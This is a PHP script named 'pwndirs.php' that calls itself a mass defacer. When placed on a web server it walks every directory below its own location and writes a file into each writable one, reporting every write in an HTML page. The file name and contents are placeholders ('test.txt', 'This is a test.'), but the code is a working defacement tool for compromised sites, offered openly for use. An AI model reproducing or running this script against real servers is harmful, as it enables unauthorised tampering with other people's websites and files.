<?php

# pwndirs.php - Mass defacer. What?
# VVinston Phelix

# Defines
##

define('DS', '/');

# Variables
##

$old_php = '';
$dir = current_dir();
$paths = array($dir);
$pwn_name = 'test.txt';
$pwn_content = 'This is a test.';

# Functions
##

# Find current dir based on PHP ver
function current_dir() {
    global $old_php;

    $php_ver[0] = "1";
    $php_ver[1] = "1";

    if ( function_exists('phpversion') ) {
        $php_ver = explode( '.', substr(phpversion(), 0, 3) );
    }

    if ($php_ver[0] <= "5") {
        if ($php_ver[1] <= "3") {
            $old_php = "1";
            $cur_dir = dirname(__FILE__);
        }
    } else {
        $cur_dir = __DIR__;
    }

    return realpath($cur_dir);
}

# Main
##

if ($old_php) {
    # Find dirs directly below __DIR__
    $files_array = array_diff( scandir($dir), array('..', '.') );

    foreach ($files_array as $old_file) {
        $dirs_path = $dir . DS . $old_file;
        if ( is_dir($dirs_path) ) {
            if ( is_writable($dirs_path) ) {
                $paths[] = $dirs_path;
            }
        }
    }
} else {
    # Find dirs recursively below __DIR__
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST,
        RecursiveIteratorIterator::CATCH_GET_CHILD
    );

    foreach ($iterator as $path => $file) {
        if ( $file->isDir() ) {
            $paths[] = $path;
        }
    }
}

# Scribble
if ( function_exists('file_put_contents') ) {
    echo "<!doctype html>\n<html lang=en>\n<title>.</title>\n<body>\n";
    foreach ($paths as $pwned) {
        $pwn_file = $pwned . DS . $pwn_name;
        if ( is_writable($pwned) ) {
            if ( file_put_contents($pwn_file, $pwn_content) ) {
                echo "Wrote to $pwn_file<br>\n";
            }
        }
    }
}
